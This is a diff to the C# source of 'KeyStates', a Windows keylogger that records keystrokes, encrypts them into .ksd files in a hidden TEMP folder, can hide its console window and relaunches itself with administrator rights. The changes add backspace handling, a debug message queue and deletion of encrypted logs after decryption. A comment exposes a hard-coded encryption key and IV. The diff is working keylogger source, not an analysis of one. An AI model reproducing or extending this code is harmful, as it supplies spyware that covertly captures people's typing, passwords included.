@@ -9,6 +9,7 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Security.Principal;
+using System.Text;
 
 new KeyStatesCl().OnStart(); // start program
 
@@ -26,8 +27,22 @@ namespace KeyStates
         public bool Scroll;
     }
 
+    public struct DbgMsgQueue
+    {
+        public String input;
+        public DbgMsgTypes type;
+        public bool timestamp;
+    }
+
+    public enum DbgMsgTypes : int
+    {
+        Default = 0,
+        Error = 1
+    }
+
     internal class KeyStatesCl
     {
+        private List<DbgMsgQueue> WaitingMsgs = new();
         private Encryption.StringEncryptionService CryTxt = new Encryption.StringEncryptionService();
 
         //private FileEncryption Encrypt = new FileEncryption(); // archaic code
@@ -53,12 +68,6 @@ namespace KeyStates
         private String TmpPath = "";
         private KeyCache StateHolder;                   // holds the state of lock keys (caps lock, num lock, scroll lock)
         private LogCache LogHolder;                     // keylogger input buffer
-
-        private enum DbgMsgTypes : int
-        {
-            Default = 0,
-            Error = 1
-        }
 
         // end section //
 
@@ -100,12 +109,8 @@ namespace KeyStates
 
         private void DestroyLog()
         {
-            //TglCon();
-            Console.Write("[!] do you want to delete log files?");
-            Thread.Sleep(200);
-            Console.Write(" [Y/N]: ");
-            String KeyPress = Console.ReadLine().ToString().ToLower();
-            if (KeyPress == "y")
+            bool KeyPress = ShowConfirmation("[!] do you want to delete log files ?");
+            if (KeyPress)
             {
                 if (Directory.Exists(TmpPath))
                 {
@@ -114,13 +119,19 @@ namespace KeyStates
                     // foreach (string ExistFile in ExistFiles)                          //
                     //     DbgMsg(ExistFile);                                           //
                     Directory.Delete(TmpPath, true);
-                    DbgMsg("folder deleted");
+                    AddMsgQ("folder deleted");
+                    Thread.Sleep(3000);
                 }
             }
             EmrKill = true;
             return;
         }
 
+        //dbg crap below
+        /* [DBG]: encryption key: 59FE94387929A1F21A221B6A0F009B2F129FAEC1CCB91859C02273BE97E34450 :[END]
+        [DBG]: encryption iv: 6186981092199FC76D924A16414AF7B5 :[END] */
+
+        /////////
         private void StartDec()
         {
             String TypKey = "";
@@ -128,7 +139,11 @@ namespace KeyStates
             DecTog = true;
 
             Console.Clear();
-            DbgMsg("entered decrypt mode");
+            AddMsgQ("entered decrypt mode");
+            while (WaitingMsgs.Count > 0)
+            {
+                Thread.Sleep(200);
+            }
             Console.Write("[+] please enter key: ");
             TypKey = Console.ReadLine();
             Console.Write("[+] please enter iv: ");
@@ -137,34 +152,76 @@ namespace KeyStates
             CryTxt.SetKey(TypKey);
             CryTxt.SetIV(TypIV);
 
-            DbgMsg($"key: ${TypKey}");
-            DbgMsg($"iv: ${TypIV}");
-            Console.Write("[!] decrypt all files? ");
-            Thread.Sleep(200);
-            Console.Write(" [Y/N]: ");
-            String KeyPress = Console.ReadLine().ToString().ToLower();
-            if (KeyPress == "y")
+            AddMsgQ($"key: ${TypKey}");
+            AddMsgQ($"iv: ${TypIV}");
+            bool KeyPress = ShowConfirmation("[!] decrypt all files? ");
+            if (KeyPress)
             {
+                bool KeyPress2 = ShowConfirmation("[!] delete original encrypted .ksd files after decryption?");
+
                 foreach (string x in Directory.EnumerateFiles(Environment.CurrentDirectory))
                 {
                     if (Path.GetExtension(x) == ".ksd")
                     {
-                        DbgMsg(x);
+                        AddMsgQ(x);
                         String TmpFln = SecureRandomString(6);
                         String EncFil = File.ReadAllText(x);
                         String DecFil = CryTxt.Decrypt(EncFil);
-                        DbgMsg($"{TmpPath}\\{TmpFln}.txt");
+                        if (DecFil == "./YYZZYY\\.")
+                        {
+                            AddMsgQ("decrypting failed", DbgMsgTypes.Error);
+                            while (WaitingMsgs.Count > 0)
+                            {
+                                Thread.Sleep(200);
+                            }
+                            Console.Write("[!] Restarting");
+                            Thread.Sleep(1000);
+                            Console.Write(".");
+                            Thread.Sleep(1000);
+                            Console.Write(".");
+                            Thread.Sleep(1000);
+                            Console.Write(".");
+                            Thread.Sleep(1000);
+                            Console.Write(".");
+                            Thread.Sleep(1000);
+                            Console.Write(".");
+                            ElevateProg();
+                            EmrKill = true;
+                            return;
+                        }
+                        if (KeyPress2)
+                        {
+                            File.Delete(x);
+                        }
+                        AddMsgQ($"{TmpPath}\\{TmpFln}.txt");
                         File.WriteAllText($"{TmpPath}\\{TmpFln}.txt", DecFil);
                         //DbgMsg($"dumped keylog cache to {TmpFln}.dat", DbgMsgTypes.Default, true);
                     }
                 }
             }
             DecTog = false;
+            while (WaitingMsgs.Count > 0)
+            {
+                Thread.Sleep(200);
+            }
+            Console.Write("[!] Restarting");
+            Thread.Sleep(1000);
+            Console.Write(".");
+            Thread.Sleep(1000);
+            Console.Write(".");
+            Thread.Sleep(1000);
+            Console.Write(".");
+            Thread.Sleep(1000);
+            Console.Write(".");
+            Thread.Sleep(1000);
+            Console.Write(".");
+            ElevateProg();
+            EmrKill = true;
         }
 
         private void LoopKeys()
         {
-            DbgMsg("keylog thread started");
+            AddMsgQ("keylog thread started");
             int x = 0;
             while (true)
             {
@@ -188,6 +245,11 @@ namespace KeyStates
                             DestroyLog();
                         if (i == ShfKey || i == 0xA0 || i == 0xA1 || i == 0x14 || i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06) // keys that are pointless to log (caps lock, shift keys, etc...)
                             break;
+                        if (i == 0x08)
+                        {
+                            LogHolder.data = LogHolder.data.Remove(LogHolder.data.Length - 1);
+                            break;
+                        }
                         if (LwUp == false || StateHolder.Caps == true)  // if the user is holding shift or caps lock is on, print the output character in uppercase, else print in lowercase
                         {
                             // Console.Write(key.ToString().ToUpper()); // dbg junk code
@@ -206,13 +268,44 @@ namespace KeyStates
                 {
                     // Console.Clear(); // dbg junk code
                     String TmpFln = SecureRandomString(6);
+                    byte[] correctBytes = Encoding.UTF8.GetBytes(LogHolder.data.Replace("\u0001", " "));
+                    string correctString = Encoding.UTF8.GetString(correctBytes);
 
-                    File.WriteAllText($"{TmpPath}\\" + TmpFln + ".ksd", CryTxt.Encrypt(LogHolder.data.Replace("\u0001", " ")));
+                    File.WriteAllText($"{TmpPath}\\" + TmpFln + ".ksd", CryTxt.Encrypt(correctString));
                     LogHolder.data = "";
-                    DbgMsg($"dumped keylog cache to {TmpFln}.ksd", DbgMsgTypes.Default, true);
+                    AddMsgQ($"dumped keylog cache to {TmpFln}.ksd", DbgMsgTypes.Default, true);
                     x = 0;
                 }
                 Thread.Sleep(75);   // delay to prevent repeating characters //
+            }
+        }
+
+        private void AddMsgQ(String input, DbgMsgTypes type = DbgMsgTypes.Default, bool timestamp = false)
+        {
+            DbgMsgQueue item;
+            item.input = input;
+            item.type = type;
+            item.timestamp = timestamp;
+            WaitingMsgs.Add(item);
+        }
+
+        private void ChkMsgQ()
+        {
+            List<DbgMsgQueue> RemCache = new();
+            List<DbgMsgQueue> WaitingMsgsCache = WaitingMsgs;
+            if (WaitingMsgsCache.Count > 0)
+            {
+                for (var i = 0; i < WaitingMsgsCache.Count; i++)
+                {
+                    var item = WaitingMsgsCache.ElementAt(i);
+                    DbgMsg(item.input, item.type, item.timestamp);
+                    RemCache.Add(item);
+                }
+                for (var i = 0; i < RemCache.Count; i++)
+                {
+                    var item = RemCache.ElementAt(i);
+                    WaitingMsgs.Remove(item);
+                }
             }
         }
 
@@ -265,14 +358,14 @@ namespace KeyStates
             // int ProcId = Process.GetCurrentProcess().Id; // dbg junk code
             if (ConStat)
             {
-                DbgMsg("console hidden");
+                AddMsgQ("console hidden");
                 ShowWindow(GetConsoleWindow(), SW_HIDE);
                 ConStat = false;
                 return;
             }
             ShowWindow(GetConsoleWindow(), SW_SHOW);
             ConStat = true;
-            DbgMsg("console restored");
+            AddMsgQ("console restored");
             return;
         }
 
@@ -283,10 +376,11 @@ namespace KeyStates
 
         private void InitCache()
         {
-            DbgMsg("initial cache set");
+            LogHolder.data = "";
             StateHolder.Caps = CheckTglState(0);
             StateHolder.Num = CheckTglState(1);
             StateHolder.Scroll = CheckTglState(2);
+            AddMsgQ("initial cache set");
         }
 
         private static bool IsAdministrator()
@@ -300,8 +394,14 @@ namespace KeyStates
         {
             if (TmpPath == "")
             {
+                if (Environment.GetEnvironmentVariable("TEMP") == null)
+                {
+                    AddMsgQ("could not find temp path, dumping data to .exe directory", DbgMsgTypes.Error);
+                    TmpPath = Path.Combine(Environment.CurrentDirectory, SecureRandomString(10));
+                    return;
+                }
                 TmpPath = Path.Combine(Environment.GetEnvironmentVariable("TEMP"), SecureRandomString(10));
-                DbgMsg("tmp path set to " + TmpPath);
+                AddMsgQ("tmp path set to " + TmpPath);
             }
             if (!Directory.Exists(TmpPath))
             {
@@ -311,6 +411,7 @@ namespace KeyStates
 
         private void UpdateCache()
         {
+            ChkMsgQ();
             int i = 0;
             foreach (var key in KeyArr)
             {
@@ -323,7 +424,7 @@ namespace KeyStates
                         }
                         MessageBeep(0x00000040);
                         StateHolder.Caps = CheckTglState(i);
-                        DbgMsg("CAPSLK " + StateHolder.Caps);
+                        AddMsgQ("CAPSLK " + StateHolder.Caps);
                         break;
 
                     case 1:
@@ -333,7 +434,7 @@ namespace KeyStates
                         }
                         MessageBeep(0x00000040);
                         StateHolder.Num = CheckTglState(i);
-                        DbgMsg("NUMLK " + StateHolder.Num);
+                        AddMsgQ("NUMLK " + StateHolder.Num);
                         break;
 
                     case 2:
@@ -343,7 +444,7 @@ namespace KeyStates
                         }
                         MessageBeep(0x00000040);
                         StateHolder.Scroll = CheckTglState(i);
-                        DbgMsg("SCRLK " + StateHolder.Scroll);
+                        AddMsgQ("SCRLK " + StateHolder.Scroll);
                         break;
                 }
                 i++;
@@ -360,7 +461,7 @@ namespace KeyStates
 
         private void LogKeys()
         {
-            DbgMsg("keytgl thread started");
+            AddMsgQ("keytgl thread started");
             StateHolder.Caps = false;
             StateHolder.Scroll = false;
             StateHolder.Num = false;
@@ -371,15 +472,22 @@ namespace KeyStates
                 if (EmrKill)
                     return;
                 UpdateCache();
-                Thread.Sleep(100);
+                Thread.Sleep(200);
             }
         }
 
-        private static bool ShowConfirmation(string message)
+        private static bool ShowConfirmation(string message, bool error = false)
         {
-            Console.ForegroundColor = ConsoleColor.Red;
-            Console.Write($"{message} (Y/N): ");
-            char response = Console.ReadKey().KeyChar;
+            System.ConsoleColor OrgColor = Console.ForegroundColor;
+            Console.ForegroundColor = ConsoleColor.DarkYellow;
+            if (error)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+            }
+
+            Console.Write($"{message} [Y/N]: ");
+            Console.ForegroundColor = OrgColor;
+            char response = (char)Console.Read();
             return response == 'Y' || response == 'y';
         }
 
@@ -387,7 +495,7 @@ namespace KeyStates
         {
             if (!IsAdministrator())
             {
-                bool continueProgram = ShowConfirmation("[!] program needs administrator permissions, relaunch as admin?");
+                bool continueProgram = ShowConfirmation("[!] program needs administrator permissions, relaunch as admin?", true);
                 if (continueProgram)
                 {
                     ElevateProg();
@@ -399,19 +507,19 @@ namespace KeyStates
                 return;
             }
             else
-                DbgMsg("succesfully launched with admin");
+                AddMsgQ("succesfully launched with admin");
 
             //TglCon(true);
-            DbgMsg("OnStart called");
+            AddMsgQ("OnStart called");
             CheckDir();
             InitCache();
             Console.ForegroundColor = ConsoleColor.Green;
             Console.WriteLine("/* 6 - 21 - 2024");
-            Console.WriteLine("   KeyStates W.I.P");
-            Console.WriteLine("   domer/PeripheralVisionPD2 */");
+            Console.WriteLine("KeyStates W.I.P");
+            Console.WriteLine("domer/PeripheralVisionPD2 */");
             Console.ForegroundColor = ConsoleColor.White;
-            DbgMsg($"encryption key: {CryTxt.ShowKey()}");
-            DbgMsg($"encryption iv: {CryTxt.ShowIV()}");
+            AddMsgQ($"encryption key: {CryTxt.ShowKey()}");
+            AddMsgQ($"encryption iv: {CryTxt.ShowIV()}");
             Thread KeyLogLoop = new(LoopKeys);
             Thread TglKeyLoop = new(LogKeys);
             KeyLogLoop.Start();
